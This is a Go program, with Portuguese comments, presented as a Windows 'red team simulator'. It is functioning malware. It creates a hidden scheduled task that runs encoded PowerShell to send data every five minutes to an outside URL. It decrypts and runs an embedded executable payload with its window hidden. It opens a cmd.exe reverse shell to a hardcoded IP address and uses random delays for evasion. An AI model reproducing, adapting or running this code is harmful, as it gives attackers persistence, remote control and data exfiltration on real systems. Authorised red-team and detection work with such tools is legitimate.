package main

import (
    "crypto/aes"
    "crypto/cipher"
    crand "crypto/rand"
    "encoding/base64"
    "errors"
    "fmt"
    "io"
    "log"
    "math/rand"
    "net"
    "os"
    "os/exec"
    "path/filepath"
    "runtime"
    "syscall"
    "time"
)

// ================================
// CONFIGURAÇÕES CENTRALIZADAS
// ================================
type Config struct {
    ExfiltrationURL   string
    C2Address         string
    TaskName          string
    AESKey            []byte
    EncryptedPayload  string
    AlertMessage      string
}

var config = Config{
    ExfiltrationURL:  "https://antoniocamelo.com",
    C2Address:        "177.223.244.162:9443",
    TaskName:         "C2DataSend",
    AESKey:           []byte("passphrasewhichneedstobe32bytes!"),
    EncryptedPayload: "U2FsdGVkX1+Hi4JKIZQPO39NaZZZfAsGurZhzlEzvNo=",
    AlertMessage: `Seus controles de segurança se revelaram INEFICIENTES para proteger sua infraestrutura. 
Em um cenário real, seu ambiente já teria sido comprometido! Como prova de conceito, este simulador:
1. Fez a evasão dos controles de Segurança
2. Criou uma tarefa no agendador (C2DataSend) 
3. Executou payload criptografado 
4. Estabeleceu conexão C2

Seus controles de segurança permitiram a execução deste simulador, isto é ALARMANTE e evidencia 
que sua infraestrutura está VULNERÁVEL a ataques modernos.`,
}

// ================================
// MÓDULO DE CRIPTOGRAFIA UNIFICADO
// ================================
type CryptoModule struct {
    key []byte
}

func NewCryptoModule(key []byte) *CryptoModule {
    return &CryptoModule{key: key}
}

func (c *CryptoModule) EncryptToBase64(plaintext string) (string, error) {
    encrypted, err := c.encrypt([]byte(plaintext))
    if err != nil {
        return "", err
    }
    return base64.StdEncoding.EncodeToString(encrypted), nil
}

func (c *CryptoModule) DecryptFromBase64(encBase64 string) (string, error) {
    ciphertext, err := base64.StdEncoding.DecodeString(encBase64)
    if err != nil {
        return "", err
    }
    
    decrypted, err := c.decrypt(ciphertext)
    if err != nil {
        return "", err
    }
    return string(decrypted), nil
}

func (c *CryptoModule) encrypt(data []byte) ([]byte, error) {
    block, err := aes.NewCipher(c.key)
    if err != nil {
        return nil, err
    }

    ciphertext := make([]byte, aes.BlockSize+len(data))
    iv := ciphertext[:aes.BlockSize]
    if _, err := io.ReadFull(crand.Reader, iv); err != nil {
        return nil, err
    }

    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(ciphertext[aes.BlockSize:], data)
    return ciphertext, nil
}

func (c *CryptoModule) decrypt(ciphertext []byte) ([]byte, error) {
    block, err := aes.NewCipher(c.key)
    if err != nil {
        return nil, err
    }

    if len(ciphertext) < aes.BlockSize {
        return nil, errors.New("ciphertext muito curto")
    }

    iv := ciphertext[:aes.BlockSize]
    ciphertext = ciphertext[aes.BlockSize:]

    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(ciphertext, ciphertext)
    return ciphertext, nil
}

// ================================
// MÓDULO DE EVASÃO
// ================================
type EvasionModule struct {
    crypto *CryptoModule
}

func NewEvasionModule(crypto *CryptoModule) *EvasionModule {
    return &EvasionModule{crypto: crypto}
}

func (e *EvasionModule) RandomDelay() {
    delay := time.Duration(rand.Intn(15)+5) * time.Second
    time.Sleep(delay)
}

func (e *EvasionModule) HiddenExec(name string, args ...string) *exec.Cmd {
    cmd := exec.Command(name, args...)
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    return cmd
}

// ================================
// MÓDULO DE PERSISTÊNCIA
// ================================
type PersistenceModule struct {
    evasion *EvasionModule
}

func NewPersistenceModule(evasion *EvasionModule) *PersistenceModule {
    return &PersistenceModule{evasion: evasion}
}

func (p *PersistenceModule) CreateScheduledTask() error {
    psCommand := fmt.Sprintf(`[System.Text.Encoding]::UTF8.GetBytes("dados de exfiltração") | %%{Invoke-WebRequest -Uri %s -Method POST -Body $_}`, config.ExfiltrationURL)
    encodedCommand := base64.StdEncoding.EncodeToString([]byte(psCommand))
    taskCommand := fmt.Sprintf("cmd.exe /C powershell -encodedCommand %s", encodedCommand)

    cmd := p.evasion.HiddenExec("schtasks", "/create", "/sc", "minute", "/mo", "5", "/tn", config.TaskName, "/tr", taskCommand, "/f")
    _, err := cmd.CombinedOutput()
    return err
}

func (p *PersistenceModule) MaintainProcess() {
    for {
        p.evasion.RandomDelay()
        // Processo persistente com delays aleatórios para evasão
    }
}

// ================================
// MÓDULO DE EXECUÇÃO DE PAYLOAD
// ================================
type PayloadModule struct {
    crypto  *CryptoModule
    evasion *EvasionModule
}

func NewPayloadModule(crypto *CryptoModule, evasion *EvasionModule) *PayloadModule {
    return &PayloadModule{crypto: crypto, evasion: evasion}
}

func (p *PayloadModule) ExecuteEncryptedPayload(encryptedPayload string) error {
    // Decodifica o payload
    decodedPayload, err := base64.StdEncoding.DecodeString(encryptedPayload)
    if err != nil {
        return fmt.Errorf("erro ao decodificar payload: %w", err)
    }

    // Descriptografa o payload
    decryptedPayload, err := p.crypto.decrypt(decodedPayload)
    if err != nil {
        return fmt.Errorf("erro ao descriptografar payload: %w", err)
    }

    // Cria arquivo temporário
    tmpFile, err := os.CreateTemp("", "payload-*.exe")
    if err != nil {
        return fmt.Errorf("erro ao criar arquivo temporário: %w", err)
    }
    defer os.Remove(tmpFile.Name())

    // Escreve o payload
    if _, err = tmpFile.Write(decryptedPayload); err != nil {
        return fmt.Errorf("erro ao escrever payload: %w", err)
    }

    // Torna executável
    if err = tmpFile.Chmod(0755); err != nil {
        return fmt.Errorf("erro ao tornar arquivo executável: %w", err)
    }

    // Executa o payload
    cmd := p.evasion.HiddenExec(tmpFile.Name())
    if err := cmd.Start(); err != nil {
        return fmt.Errorf("erro ao executar payload: %w", err)
    }

    log.Println("Payload executado com sucesso!")
    return nil
}

// ================================
// MÓDULO DE COMUNICAÇÃO C2
// ================================
type C2Module struct {
    evasion *EvasionModule
}

func NewC2Module(evasion *EvasionModule) *C2Module {
    return &C2Module{evasion: evasion}
}

func (c *C2Module) EstablishReverseShell(target string) error {
    conn, err := net.Dial("tcp", target)
    if err != nil {
        return fmt.Errorf("erro ao conectar com C2: %w", err)
    }
    defer conn.Close()

    // Redireciona stdin, stdout e stderr para a conexão
    cmd := c.evasion.HiddenExec("cmd.exe")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    
    log.Printf("Conexão C2 estabelecida com %s", target)
    return cmd.Run()
}

// ================================
// MÓDULO DE ALERTA
// ================================
type AlertModule struct {
    crypto *CryptoModule
}

func NewAlertModule(crypto *CryptoModule) *AlertModule {
    return &AlertModule{crypto: crypto}
}

func (a *AlertModule) CreateDesktopAlert() error {
    desktopPath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
    alertFilePath := filepath.Join(desktopPath, "Alerta_de_Seguranca_RedTeam.txt")

    // Criptografa e depois descriptografa para demonstrar a funcionalidade
    encryptedMessage, err := a.crypto.EncryptToBase64(config.AlertMessage)
    if err != nil {
        return fmt.Errorf("erro ao criptografar mensagem: %w", err)
    }

    alertText, err := a.crypto.DecryptFromBase64(encryptedMessage)
    if err != nil {
        return fmt.Errorf("erro ao descriptografar mensagem: %w", err)
    }

    file, err := os.Create(alertFilePath)
    if err != nil {
        return fmt.Errorf("erro ao criar arquivo de alerta: %w", err)
    }
    defer file.Close()

    timestamp := time.Now().Format("2006-01-02 15:04:05")
    fullMessage := fmt.Sprintf("=== SIMULAÇÃO RED TEAM - %s ===\n\n%s\n\n=== FIM DO ALERTA ===", timestamp, alertText)

    if _, err = file.WriteString(fullMessage); err != nil {
        return fmt.Errorf("erro ao escrever arquivo de alerta: %w", err)
    }

    log.Println("Arquivo de alerta criado na área de trabalho")
    return nil
}

// ================================
// ORQUESTRADOR PRINCIPAL
// ================================
type RedTeamSimulator struct {
    crypto      *CryptoModule
    evasion     *EvasionModule
    persistence *PersistenceModule
    payload     *PayloadModule
    c2          *C2Module
    alert       *AlertModule
}

func NewRedTeamSimulator() *RedTeamSimulator {
    crypto := NewCryptoModule(config.AESKey)
    evasion := NewEvasionModule(crypto)
    
    return &RedTeamSimulator{
        crypto:      crypto,
        evasion:     evasion,
        persistence: NewPersistenceModule(evasion),
        payload:     NewPayloadModule(crypto, evasion),
        c2:          NewC2Module(evasion),
        alert:       NewAlertModule(crypto),
    }
}

func (r *RedTeamSimulator) Execute() {
    log.Println("=== INICIANDO SIMULAÇÃO RED TEAM ===")

    // Fase 1: Criar alerta de segurança
    if err := r.alert.CreateDesktopAlert(); err != nil {
        log.Printf("Erro na criação do alerta: %v", err)
    }

    // Fase 2: Estabelecer persistência
    if err := r.persistence.CreateScheduledTask(); err != nil {
        log.Printf("Erro na criação da tarefa agendada: %v", err)
    }

    // Fase 3: Executar payload (se disponível)
    if config.EncryptedPayload != "" {
        if err := r.payload.ExecuteEncryptedPayload(config.EncryptedPayload); err != nil {
            log.Printf("Erro na execução do payload: %v", err)
        }
    }

    // Fase 4: Estabelecer comunicação C2
    go func() {
        r.evasion.RandomDelay() // Delay antes da conexão C2
        if err := r.c2.EstablishReverseShell(config.C2Address); err != nil {
            log.Printf("Erro na conexão C2: %v", err)
        }
    }()

    // Fase 5: Manter processo persistente
    log.Println("=== SIMULAÇÃO EM EXECUÇÃO - PROCESSO PERSISTENTE ===")
    r.persistence.MaintainProcess()
}

// ================================
// FUNÇÃO PRINCIPAL
// ================================
func main() {
    // Verificação de sistema operacional
    if runtime.GOOS != "windows" {
        log.Println("Este simulador é específico para Windows")
        os.Exit(0)
    }

    // Configuração de logging
    log.SetFlags(log.LstdFlags | log.Lshortfile)
    
    // Seed para randomização
    rand.Seed(time.Now().UnixNano())

    // Inicialização e execução do simulador
    simulator := NewRedTeamSimulator()
    simulator.Execute()
}
